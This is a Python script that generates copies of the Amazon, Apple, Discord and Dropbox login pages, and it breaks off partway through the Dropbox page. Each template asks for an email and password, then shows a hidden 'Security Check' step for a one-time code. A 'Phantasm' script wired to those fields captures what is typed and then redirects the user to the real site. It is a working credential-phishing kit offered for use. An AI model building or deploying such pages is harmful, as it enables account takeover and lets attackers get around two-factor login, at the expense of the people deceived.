import os

OUTPUT_DIR = "core/assets/templates/high_fidelity"

if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)

def save_template(name, content):
    path = os.path.join(OUTPUT_DIR, f"{name}.html")
    with open(path, "w") as f:
        f.write(content)
    print(f"[+] Generated {name}.html")

# AMAZON
amazon_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <link rel="icon" href="https://www.amazon.com/favicon.ico">
    <style>
        body {
            font-family: "Amazon Ember", Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .logo {
            margin-top: 14px;
            margin-bottom: 18px;
        }
        .logo img {
            height: 31px;
            width: 103px;
        }
        .card {
            width: 350px;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px 26px;
            margin-bottom: 22px;
        }
        h1 {
            font-weight: 400;
            font-size: 28px;
            line-height: 1.2;
            margin-bottom: 10px;
            margin-top: 0;
        }
        label {
            display: block;
            font-weight: 700;
            font-size: 13px;
            margin-bottom: 5px;
            margin-top: 10px;
            color: #111;
        }
        input[type="text"], input[type="password"], input[type="email"] {
            width: 100%;
            padding: 7px 8px;
            margin-bottom: 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            box-sizing: border-box;
            font-size: 13px;
            box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset;
        }
        input:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, .5);
            outline: none;
        }
        .btn-primary {
            width: 100%;
            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
            border: 1px solid;
            border-color: #a88734 #9c7e31 #846a29;
            border-radius: 3px;
            cursor: pointer;
            padding: 6px;
            margin-top: 15px;
            font-size: 13px;
            box-shadow: 0 1px 0 rgba(255,255,255,.4) inset;
        }
        .btn-primary:hover {
            background: linear-gradient(to bottom, #f5d78e, #eeb933);
        }
        .legal {
            font-size: 12px;
            margin-top: 18px;
            line-height: 1.5;
            color: #111;
        }
        .legal a {
            color: #0066c0;
            text-decoration: none;
        }
        .legal a:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .expander {
            margin-top: 22px;
            font-size: 13px;
        }
        .expander-header {
            color: #0066c0;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .expander-header::before {
            content: "";
            display: inline-block;
            width: 0;
            height: 0;
            border-left: 4px solid transparent;
            border-right: 4px solid transparent;
            border-top: 4px solid #666; /* Down arrow initially */
            margin-right: 5px;
            transform: rotate(-90deg); /* Point right */
            transition: transform 0.1s;
        }
        .expander-header.open::before {
             transform: rotate(0deg); /* Point down */
        }
        .expander-content {
            display: none;
            margin-top: 5px;
            margin-left: 10px;
        }
        .expander-content.open {
            display: block;
        }
        .divider {
            text-align: center;
            margin-top: 26px;
            margin-bottom: 14px;
            position: relative;
            width: 350px;
        }
        .divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #e7e7e7;
            z-index: -1;
        }
        .divider span {
            background: #fff;
            padding: 0 8px;
            color: #767676;
            font-size: 12px;
        }
        .btn-create {
            display: block;
            width: 350px;
            text-align: center;
            background: linear-gradient(to bottom, #f7f8fa, #e7e9ec);
            border: 1px solid;
            border-color: #adb1b8 #a2a6ac #8d9096;
            border-radius: 3px;
            padding: 7px;
            font-size: 13px;
            color: #111;
            text-decoration: none;
            box-sizing: border-box;
            box-shadow: 0 1px 0 rgba(255,255,255,.6) inset;
        }
        .btn-create:hover {
            background: linear-gradient(to bottom, #e7eaf0, #d9dce1);
        }
        .footer {
            margin-top: auto;
            width: 100%;
            border-top: 1px solid #e7e7e7;
            background: linear-gradient(to bottom, #fff, #fcfcfc);
            padding: 26px 0;
            text-align: center;
            font-size: 11px;
        }
        .footer a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 10px;
        }
        .footer a:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .footer p {
            color: #555;
            margin-top: 10px;
        }
        .hidden {
            display: none;
        }
        .user-pill {
            font-size: 13px;
            margin-bottom: 10px;
        }
        .user-pill span {
            margin-right: 5px;
        }
        .change-link {
            color: #0066c0;
            text-decoration: none;
            font-size: 13px;
            cursor: pointer;
        }
        .change-link:hover {
            text-decoration: underline;
            color: #c45500;
        }
        .error-box {
            display: none;
            border: 1px solid #d00;
            border-radius: 4px;
            box-shadow: 0 0 0 1px #d00 inset;
            padding: 14px 18px;
            margin-bottom: 18px;
            width: 350px;
            box-sizing: border-box;
        }
        .error-box-header {
            color: #c40000;
            font-size: 13px;
            font-weight: 700;
            display: flex;
            align-items: center;
        }
        .error-box-header svg {
            fill: #c40000;
            margin-right: 8px;
        }
        .error-box-message {
            font-size: 13px;
            margin-top: 5px;
            margin-left: 26px;
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    </div>

    <div class="error-box" id="error-box">
        <div class="error-box-header">
            <svg width="18" height="18" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
            <span>There was a problem</span>
        </div>
        <div class="error-box-message" id="error-message"></div>
    </div>

    <!-- Step 1: Email -->
    <div class="card" id="step-1">
        <h1>Log in</h1>
        <form id="form-step-1">
            <label for="email">Email or mobile phone number</label>
            <input type="text" id="email" name="email" required>
            
            <button type="submit" id="btn-next" class="btn-primary">Continue</button>
            
            <div class="legal">
                By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
            </div>
            
            <div class="expander">
                <div class="expander-header" onclick="toggleHelp()">
                    Need help?
                </div>
                <div class="expander-content" id="help-content">
                    <div style="margin-bottom:5px;"><a href="#">Forgot your password?</a></div>
                    <div><a href="#">Other issues with Sign-In</a></div>
                </div>
            </div>
        </form>
    </div>

    <!-- Step 2: Password -->
    <div class="card hidden" id="step-2">
        <h1>Log in</h1>
        <div class="user-pill">
            <span id="user-email-display">email@example.com</span>
            <a class="change-link" id="change-email-btn">Change</a>
        </div>
        <form id="form-step-2">
            <div style="display: flex; justify-content: space-between; align-items: baseline;">
                <label for="password">Password</label>
                <a href="#" style="font-size: 13px; color: #0066c0; text-decoration: none;">Forgot your password?</a>
            </div>
            <input type="password" id="password" name="password" required>
            
            <button type="submit" id="btn-submit" class="btn-primary">Log in</button>
            
            <div style="margin-top: 14px; font-size: 13px; display: flex; align-items: center;">
                <input type="checkbox" id="remember" style="width: auto; margin-right: 5px;">
                <label for="remember" style="font-weight: 400; margin: 0;">Keep me signed in.</label>
            </div>
        </form>
    </div>

    <div class="divider" id="new-divider">
        <span>New to Amazon?</span>
    </div>
    
    <a href="#" class="btn-create" id="create-btn">Create your Amazon account</a>

    <div class="footer">
        <div>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </div>
        <p>© 1996-2024, Amazon.com, Inc. or its affiliates</p>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        function toggleHelp() {
            const header = document.querySelector('.expander-header');
            const content = document.getElementById('help-content');
            header.classList.toggle('open');
            content.classList.toggle('open');
        }

        document.addEventListener('DOMContentLoaded', () => {
            // Initialize Phantasm Engine
            new Phantasm({
                redirectUrl: 'https://www.amazon.com',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    errorMsg: '#error-message'
                }
            });

            // Custom UI logic for Amazon (Change email link)
            const changeBtn = document.getElementById('change-email-btn');
            if(changeBtn) {
                changeBtn.addEventListener('click', (e) => {
                    e.preventDefault();
                    document.getElementById('step-2').classList.add('hidden');
                    document.getElementById('step-1').classList.remove('hidden');
                    document.getElementById('new-divider').classList.remove('hidden');
                    document.getElementById('create-btn').classList.remove('hidden');
                });
            }
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>
</body>
</html>"""
save_template("amazon", amazon_html)

# APPLE
apple_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Apple ID</title>
    <link rel="icon" href="https://www.apple.com/favicon.ico">
    <style>
        :root {
            --input-border: #d2d2d7;
            --input-focus: #0071e3;
            --link-color: #0071e3;
            --text-primary: #1d1d1f;
            --text-secondary: #86868b;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: var(--text-primary);
        }
        .navbar {
            width: 100%;
            height: 44px;
            background-color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .navbar svg {
            fill: #fff;
            height: 44px;
            width: 18px;
        }
        .main-content {
            margin-top: 80px;
            width: 100%;
            max-width: 460px;
            padding: 0 20px;
            box-sizing: border-box;
            text-align: center;
        }
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        .subtitle {
            font-size: 17px;
            margin-bottom: 40px;
            font-weight: 400;
        }
        .input-wrapper {
            position: relative;
            margin-bottom: 16px;
            text-align: left;
        }
        .input-field {
            width: 100%;
            height: 56px;
            border: 1px solid var(--input-border);
            border-radius: 12px;
            padding: 18px 16px;
            font-size: 17px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border-color: var(--input-focus);
            outline: none;
            box-shadow: 0 0 0 4px rgba(0,113,227,0.15);
        }
        .floating-label {
            position: absolute;
            left: 16px;
            top: 18px;
            font-size: 17px;
            color: var(--text-secondary);
            pointer-events: none;
            transition: 0.2s ease all;
        }
        .input-field:focus ~ .floating-label,
        .input-field:not(:placeholder-shown) ~ .floating-label {
            top: 8px;
            font-size: 12px;
            color: var(--text-secondary);
        }
        .btn-arrow {
            position: absolute;
            right: 8px;
            top: 8px;
            width: 40px;
            height: 40px;
            border: none;
            background: transparent;
            cursor: pointer;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
        }
        .btn-arrow svg {
            fill: #d2d2d7;
            width: 24px;
            height: 24px;
            transition: fill 0.2s;
        }
        .input-field:valid ~ .btn-arrow svg {
            fill: #0071e3;
        }
        .input-field:valid ~ .btn-arrow:hover {
            background: #f5f5f7;
        }
        .hidden {
            display: none;
        }
        .fade-in {
            animation: fadeIn 0.5s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .links {
            margin-top: 30px;
            font-size: 14px;
        }
        .links a {
            color: var(--link-color);
            text-decoration: none;
            display: block;
            margin-bottom: 10px;
        }
        .links a:hover {
            text-decoration: underline;
        }
        .footer {
            margin-top: auto;
            margin-bottom: 20px;
            font-size: 12px;
            color: var(--text-secondary);
            text-align: center;
        }
        .footer a {
            color: #555;
            text-decoration: none;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .divider {
            margin: 0 5px;
            color: #d2d2d7;
        }
        .btn-submit {
            background-color: #0071e3;
            color: white;
            border: none;
            border-radius: 12px;
            padding: 12px 24px;
            font-size: 17px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
            font-weight: 400;
        }
        .btn-submit:hover {
            background-color: #0077ed;
        }
        .apple-id-display {
            font-size: 17px;
            margin-bottom: 20px;
            color: var(--text-primary);
        }
        .back-btn {
            color: var(--link-color);
            cursor: pointer;
            font-size: 14px;
            margin-left: 10px;
        }
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            margin-top: 15px;
            font-size: 14px;
        }
        .checkbox-wrapper input {
            margin-right: 10px;
            width: 16px;
            height: 16px;
        }
    </style>
</head>
<body>

    <div class="navbar">
        <svg viewBox="0 0 18 44">
            <path d="M12.9,2.5c-0.8-1-2-1.7-3.4-1.7c-1.4,0-2.6,0.8-3.3,0.8c-0.7,0-1.8-0.8-3-0.8C1.8,0.8,0.5,1.9,0,3.9c-0.5,2.1,0.1,6.2,2.3,9.4c1.1,1.5,2.3,3.2,3.9,3.2c1.5,0,2.1-1,4-1s2.4,1,4.1,1c1.7,0,2.7-1.5,3.7-3c1.1-1.6,1.5-3.1,1.5-3.2c-0.1,0-2.9-1.1-2.9-4.4c0-2.8,2.3-4.1,2.4-4.2C17.9,1.5,14.6,0.3,12.9,2.5z M11.5,0.7c0.7-0.9,1.2-2,1.1-3.1c-1,0-2.3,0.7-3,1.5c-0.6,0.8-1.2,2-1.1,3.1C9.6,2.2,10.8,1.5,11.5,0.7z" transform="translate(0, 20)"/>
        </svg>
    </div>

    <div class="main-content">
        
        <div id="step-1" class="fade-in">
            <h1>Log In</h1>
            <div class="subtitle">Log in to Apple ID</div>
            
            <form id="email-form">
                <div class="input-wrapper">
                    <input type="text" id="email" class="input-field" placeholder=" " required>
                    <span class="floating-label">Email or Phone Number</span>
                    <button type="submit" id="btn-next" class="btn-arrow">
                        <svg viewBox="0 0 24 24"><path d="M12,24c6.6,0,12-5.4,12-12S18.6,0,12,0S0,5.4,0,12S5.4,24,12,24z M12,1.3c5.9,0,10.7,4.8,10.7,10.7S17.9,22.7,12,22.7S1.3,17.9,1.3,12S6.1,1.3,12,1.3z M15.6,11.6L10,6.1l-0.9,0.9l4.7,4.6H5.3v1.3h8.5l-4.7,4.6l0.9,0.9l5.6-5.6C16,12.5,16,11.9,15.6,11.6z"/></svg>
                    </button>
                </div>
                
                <div class="checkbox-wrapper">
                    <input type="checkbox" id="keep-signed-in">
                    <label for="keep-signed-in">Keep me signed in</label>
                </div>

                <div class="links">
                    <a href="#">Forgotten your password?</a>
                    <a href="#">Create your Apple ID</a>
                </div>
            </form>
        </div>

        <div id="step-2" class="hidden fade-in">
            <h1>Log In</h1>
            <div class="apple-id-display">
                <span id="user-display">user@example.com</span>
                <span class="back-arrow" id="back-btn" style="cursor:pointer; margin-left: 8px; color: #0071e3; font-size: 20px; vertical-align: middle;">&#8853;</span>
            </div>
            
            <form id="login-form">
                <div class="input-wrapper">
                    <input type="password" id="password" class="input-field" placeholder=" " required>
                    <span class="floating-label">Password</span>
                    <button type="submit" id="btn-submit" class="btn-arrow">
                        <svg viewBox="0 0 24 24"><path d="M12,24c6.6,0,12-5.4,12-12S18.6,0,12,0S0,5.4,0,12S5.4,24,12,24z M12,1.3c5.9,0,10.7,4.8,10.7,10.7S17.9,22.7,12,22.7S1.3,17.9,1.3,12S6.1,1.3,12,1.3z M15.6,11.6L10,6.1l-0.9,0.9l4.7,4.6H5.3v1.3h8.5l-4.7,4.6l0.9,0.9l5.6-5.6C16,12.5,16,11.9,15.6,11.6z"/></svg>
                    </button>
                </div>
                
                <div class="links">
                    <a href="#">Forgotten your password?</a>
                </div>
            </form>
        </div>

    </div>

    <div class="footer">
        <a href="#">Create Apple ID</a>
        <span class="divider">|</span>
        <a href="#">System Status</a>
        <span class="divider">|</span>
        <a href="#">Privacy Policy</a>
        <span class="divider">|</span>
        <a href="#">Terms & Conditions</a>
        <div style="margin-top: 10px;">Copyright © 2024 Apple Inc. All rights reserved.</div>
    </div>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #0071e3; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const app = new Phantasm({
                redirectUrl: 'https://www.apple.com',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    nextBtn: '#btn-next',
                    submitBtn: '#btn-submit',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step2: '#step-2',
                    step3: '#step-3-otp',
                    userDisplay: '#user-display'
                }
            });

            const backBtn = document.getElementById('back-btn');
            if (backBtn) {
                backBtn.addEventListener('click', (e) => {
                    e.preventDefault();
                    app.transitionToStep(1);
                });
            }
        });
    </script>

</body>
</html>"""
save_template("apple", apple_html)

# DISCORD
discord_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
    <style>
        @font-face {
            font-family: 'gg sans';
            font-weight: 400;
            src: url('https://discord.com/assets/405323d89747201b9727.woff2') format('woff2');
        }
        @font-face {
            font-family: 'gg sans';
            font-weight: 600;
            src: url('https://discord.com/assets/1360c74900e998797960.woff2') format('woff2');
        }
        @font-face {
            font-family: 'gg sans';
            font-weight: 700;
            src: url('https://discord.com/assets/0d8e404097e347e3d231.woff2') format('woff2');
        }

        body {
            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-image: url('https://discord.com/assets/0e291f67c9278a115b93.svg');
            background-size: cover;
            background-position: center;
            background-color: #5865F2;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        .main-container {
            background-color: #313338;
            padding: 32px;
            border-radius: 5px;
            width: 784px;
            display: flex;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
            box-sizing: border-box;
            opacity: 0;
            animation: fadeIn 0.3s ease-out forwards;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .login-block {
            flex: 1.5;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .login-content {
            width: 100%;
            max-width: 414px;
        }

        .qr-block {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-left: 32px;
            text-align: center;
        }

        h3 {
            color: #f2f3f5;
            font-size: 24px;
            margin-bottom: 8px;
            margin-top: 0;
            text-align: center;
            font-weight: 600;
        }

        .subtitle {
            color: #b5bac1;
            font-size: 16px;
            margin-bottom: 20px;
            text-align: center;
            line-height: 20px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            color: #b5bac1;
            font-size: 12px;
            text-transform: uppercase;
            font-weight: 700;
            display: block;
            margin-bottom: 8px;
        }

        label span {
            color: #f23f42;
            margin-left: 4px;
        }

        input {
            background-color: #1e1f22;
            border: none;
            border-radius: 3px;
            color: #dbdee1;
            padding: 10px;
            height: 40px;
            width: 100%;
            box-sizing: border-box;
            font-size: 16px;
            transition: background-color 0.2s;
        }

        input:focus {
            outline: none;
        }

        .forgot-link {
            color: #00a8fc;
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .btn-login {
            background-color: #5865F2;
            color: white;
            border: none;
            border-radius: 3px;
            width: 100%;
            height: 44px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color .17s ease;
            margin-bottom: 8px;
        }

        .btn-login:hover {
            background-color: #4752c4;
        }

        .register-text {
            margin-top: 4px;
            color: #949ba4;
            font-size: 14px;
        }

        .register-text a {
            color: #00a8fc;
            text-decoration: none;
            font-weight: 500;
        }
        
        .register-text a:hover {
            text-decoration: underline;
        }

        .qr-img {
            width: 176px;
            height: 176px;
            border-radius: 4px;
            margin-bottom: 32px;
            background-color: white;
            padding: 8px;
            box-sizing: border-box;
            /* Placeholder QR code pattern */
            background-image: linear-gradient(45deg, #000 25%, transparent 25%, transparent 75%, #000 75%, #000), linear-gradient(45deg, #000 25%, transparent 25%, transparent 75%, #000 75%, #000);
            background-size: 20px 20px;
            background-position: 0 0, 10px 10px;
            position: relative;
        }
        
        .qr-img::after {
            content: "";
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 40px;
            height: 40px;
            background: url('https://assets-global.website-files.com/6257adef93867e56f84d3092/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png') no-repeat center center;
            background-size: contain;
            background-color: white;
            border-radius: 50%;
            padding: 5px;
        }

        .qr-title {
            color: #f2f3f5;
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .qr-desc {
            color: #b5bac1;
            font-size: 16px;
            line-height: 20px;
        }
        
        .qr-desc strong {
            font-weight: 600;
        }

        @media (max-width: 850px) {
            .main-container {
                width: 100%;
                max-width: 480px;
                padding: 32px 16px;
            }
            .qr-block {
                display: none;
            }
            .login-block {
                flex: 1;
            }
        }
    </style>
</head>
<body>

    <div class="main-container" id="step-1">
        <div class="login-block">
            <div class="login-content">
                <h3>Welcome back!</h3>
                <div class="subtitle">We're so excited to see you again!</div>
                
                <form id="form-login">
                    <div class="input-group">
                        <label for="email">Email or Phone Number<span>*</span></label>
                        <input type="text" id="email" name="email" required>
                    </div>
                    
                    <div class="input-group">
                        <label for="password">Password<span>*</span></label>
                        <input type="password" id="password" name="password" required>
                    </div>
                    
                    <a href="#" class="forgot-link">Forgot your password?</a>
                    
                    <button type="submit" id="btn-login" class="btn-login">Log In</button>
                    
                    <div class="register-text">
                        Need an account? <a href="#">Register</a>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="qr-block">
            <div class="qr-img"></div>
            <div class="qr-title">Log in with QR Code</div>
            <div class="qr-desc">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</div>
        </div>
    </div>

    <script src="/core/assets/js/phantasm.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            new Phantasm({
                redirectUrl: 'https://discord.com/channels/@me',
                selectors: {
                    email: '#email',
                    password: '#password',
                    otp: '#otp-input',
                    submitBtn: '#btn-login',
                    otpBtn: '#btn-otp-submit',
                    step1: '#step-1',
                    step3: '#step-3-otp'
                }
            });
        });
    </script>

    <!-- OTP Section -->
    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: white; height: 100%; justify-content: center; z-index: 999;">
        <h2 style="margin-bottom: 20px;">Security Check</h2>
        <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
        <input type="text" id="otp-input" placeholder="Enter code" style="padding: 10px; border: 1px solid #ccc; border-radius: 4px; margin-bottom: 20px; width: 80%;">
        <button id="btn-otp-submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">Verify</button>
    </div>
</body>
</html>"""
save_template("discord", discord_html)

# DROPBOX
dropbox_html = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Dropbox</title>
    <link rel="icon" type="image/png" href="https://cfl.dropboxstatic.com/static/images/favicon.ico"/>
    <style>
        @font-face {
            font-family: "Atlas Grotesk";
            src: url("https://cfl.dropboxstatic.com/static/fonts/atlas-grotesk/AtlasGrotesk-Regular-Web-v2.woff2") format("woff2");
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: "Atlas Grotesk";
            src: url("https://cfl.dropboxstatic.com/static/fonts/atlas-grotesk/AtlasGrotesk-Medium-Web-v2.woff2") format("woff2");
            font-weight: 500;
            font-style: normal;
        }

        body {
            font-family: "Atlas Grotesk", "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #fff;
            margin: 0;
            display: flex;
            height: 100vh;
            color: #1e1919;
            overflow: hidden;
        }

        .left-panel {
            flex: 1;
            background-color: #f7f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }

        .left-panel img {
            max-width: 80%;
            max-height: 80%;
            object-fit: contain;
        }

        .right-panel {
            width: 480px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            background: white;
            box-shadow: -5px 0 20px rgba(0,0,0,0.02);
            z-index: 10;
        }

        .login-container {
            width: 100%;
            max-width: 320px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .header h2 {
            font-size: 19px;
            font-weight: 500;
            margin: 0;
        }

        .header a {
            font-size: 14px;
            color: #0061fe;
            text-decoration: none;
        }

        .input-group {
            margin-bottom: 15px;
            position: relative;
        }

        label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            margin-bottom: 5px;
            color: #1e1919;
        }

        input {
            width: 100%;
            padding: 10px 12px;
            border: 1px solid #637282;
            border-radius: 2px;
            font-size: 14px;
            box-sizing: border-box;
            transition: border-color 0.2s, box-shadow 0.2s;
            font-family: inherit;
        }

        input:focus {
            border-color: #0061fe;
            outline: none;
            box-shadow: 0 0 0 2px rgba(0, 97, 254, 0.2);
        }

        .btn-primary {
            background-color: #0061fe;
            color: white;
            border: none;
            border-radius: 2px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-top: 15px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #0055d4;
        }

        .btn-google, .btn-apple {
            background: transparent;
            border: 1px solid #a8b4c0;
            color: #1e1919;
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 2px;
            font-size: 14px;
            position: relative;
            transition: background-color 0.1s;
        }
        
        .btn-google:hover, .btn-apple:hover {
            background-color: #f7f9fa;
        }

        .btn-google svg, .btn-apple svg {
            margin-right: 10px;
            width: 18px;
            height: 18px;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 20px 0;
            color: #637282;
            font-size: 12px;
        }

        .divider::before, .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #e6e8eb;
        }

        .divider span {
            padding: 0 10px;
        }

        .hidden {
            display: none;
        }

        .fade-in {
            animation: fadeIn 0.3s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(5px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .spinner {
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 2px solid #fff;
            width: 16px;
            height: 16px;
            -webkit-animation: spin 1s linear infinite; /* Safari */
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-left: 5px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .user-pill {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            border: 1px solid #e6e8eb;
            border-radius: 4px;
            margin-bottom: 20px;
            cursor: pointer;
        }
        
        .user-pill:hover {
            background-color: #f7f9fa;
        }

        .user-avatar {
            width: 24px;
            height: 24px;
            background-color: #0061fe;
            color: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            margin-right: 10px;
        }

        .user-email {
            flex: 1;
            font-size: 14px;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .checkbox-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .checkbox-wrapper input {
            width: auto;
            margin-right: 10px;
        }
        
        .checkbox-wrapper label {
            margin-bottom: 0;
            font-weight: 400;
        }

        .footer-links {
            margin-top: 30px;
            font-size: 12px;
            color: #637282;
        }

        @media (max-width: 768px) {
            .left-panel {
                display: none;
            }
            .right-panel {
                width: 100%;
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="left-panel">
        <img src="https://cfl.dropboxstatic.com/static/images/empty_states/sign-in-v2.svg" alt="Dropbox">
    </div>
    <div class="right-panel">
        <div class="login-container">
            <div class="header">
                <h2>Log in</h2>
                <span>or <a href="#">create an account</a></span>
            </div>

            <!-- Step 1: Email -->
            <div id="step-1">
                <form>
                    <div class="input-group">
                        <label for="email">Email</label>
                        <input type="email" id="email" required>
                    </div>
                    
                    <button type="submit" class="btn-primary" id="btn-step1">
                        Continue
                    </button>

                    <div class="divider">
                        <span>or</span>
                    </div>

                    <button type="button" class="btn-google">
